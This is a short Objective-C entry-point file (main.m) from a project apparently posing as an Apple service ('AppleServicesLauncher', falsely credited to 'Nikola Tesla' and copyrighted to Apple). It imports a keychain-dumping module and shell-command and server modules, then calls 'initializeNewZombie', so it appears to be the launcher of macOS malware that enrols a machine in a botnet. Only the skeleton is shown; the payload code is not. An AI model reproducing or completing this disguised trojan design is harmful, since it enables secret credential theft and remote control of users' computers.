//
//  main.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "WTHTTPApi.h"
#import "WTServerApi.h"
#import "WTShellCommands.h"
#import "WTUserApi.h"
#import "keychaindump.h"
#import "WTConfig.h"

int main(int argc, const char * argv[]) {
//    NSLog(@"%@", [WTUUIDApi getSystemUUID]);
    WTConfig *config = [WTConfig getConfig];
    [config clearDefaults];
    [WTServerApi initializeNewZombie];
    return 0;
}
